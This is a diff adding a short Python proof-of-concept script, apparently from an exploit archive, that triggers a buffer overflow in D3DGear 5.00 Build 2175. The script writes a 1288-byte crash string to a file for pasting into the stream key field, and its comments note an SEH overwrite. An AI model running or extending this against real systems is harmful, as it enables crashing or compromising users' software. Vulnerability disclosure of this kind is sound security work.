@@ -1,0 +1,25 @@
+#!/usr/bin/python
+ 
+#
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Exploit Title: D3DGear 5.00 Build 2175 - Buffer Overflow
+# Date: 07-11-2017
+# Vulnerable Software: D3DGear 5.00 Build 2175
+# Vendor Homepage: http://www.d3dgear.com/
+# Version: 5.00 Build 2175
+# Software Link: http://www.d3dgear.com/products.htm
+# Tested On: Windows 7 x86
+#
+#
+# PoC: generate crash.txt, open program, select broadcast, paste crash.txt contents in stream key
+#
+# app crashes; 00420042 Pointer to next SEH record; no eip overwrite; one unicode ppr pointer
+#
+  
+file = "crash.txt"
+
+buffer = "A"* 1284 + "B"*4
+writeFile = open (file, "w")
+writeFile.write( buffer )
+writeFile.close()
